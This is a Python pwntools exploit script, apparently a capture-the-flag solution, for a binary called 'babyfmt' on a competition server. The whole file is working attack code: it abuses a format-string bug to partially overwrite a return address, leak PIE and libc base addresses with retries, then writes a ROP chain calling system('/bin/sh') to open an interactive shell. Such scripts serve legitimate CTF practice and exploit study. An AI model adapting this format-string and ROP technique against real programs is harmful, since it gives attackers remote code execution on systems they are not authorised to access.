#!/usr/bin/env python3
from pwn import *

def start():
    if args.REMOTE:
        return remote(HOST, PORT)
    elif args.GDB:
        p = process(elf.path)
        gdb.attach(p)
        return p
    else:
        return process(elf.path)

HOST = 'ccsc.mouflonarena.com'
PORT = 32088
elf = ELF('./babyfmt')
rop = ROP(elf)
libc = ELF('./libc.so.6')
ld = ELF('./ld.so.2')
context(log_level='debug', binary=elf)

vuln_off = 0x1189
ret_off = 0x1261
read_sym_off = libc.sym['read']
main_sym_off = elf.sym['main']

io = False
ret_slot_call1 = False  

def attempt():
    global io, ret_slot_call1
    io = start()
    payload = f'%{vuln_off}c%7$hn'.encode() + b'.%43$p.%3$p.%7$p'
    io.sendlineafter(b'> ', payload)
    leaks = io.recvline().decode(errors='ignore').split('.')
    main_leak = int(leaks[1], 16)         
    read_leak = int(leaks[2], 16)          

    log.success(f'PIE leak (main+69):  {hex(main_leak)}')
    log.success(f'libc leak (read+14): {hex(read_leak)}')

    libc.address = read_leak - read_sym_off - 14
    elf.address  = main_leak - main_sym_off - 69

    log.success(f'libc base: {hex(libc.address)}')
    log.success(f'PIE base:  {hex(elf.address)}')

    banner = b''
    try:
        banner = io.recvline(timeout=2)
    except EOFError:
        pass

    if b'Welcome' not in banner:
        log.failure('1st partial overwrite failed, retrying...')
        io.close()
        return False

    ret_slot_call1 = int(leaks[3].split('W')[0], 16)  
    log.success(f'ret_slot_call1: {hex(ret_slot_call1)}')
    return io

while not io:
    io = attempt()

ret_slot_call2 = ret_slot_call1 + 8
log.success(f'ret_slot_call2: {hex(ret_slot_call2)}')

libc_rop = ROP(libc)
pop_rdi = libc_rop.find_gadget(['pop rdi', 'ret'])[0]
ret = libc_rop.find_gadget(['ret'])[0]
binsh = next(libc.search(b'/bin/sh\x00'))
system = libc.symbols['system']

log.info(f'ret: {hex(ret)}')
log.info(f'pop rdi; ret: {hex(pop_rdi)}')
log.info(f'/bin/sh: {hex(binsh)}')
log.info(f'system: {hex(system)}')

rop_chain_writes = {
    ret_slot_call2:      ret,
    ret_slot_call2 + 8:  pop_rdi,
    ret_slot_call2 + 16: binsh,
    ret_slot_call2 + 24: system,
}

payload = fmtstr_payload(8, rop_chain_writes, write_size='short')

io.sendline(payload)
io.interactive()
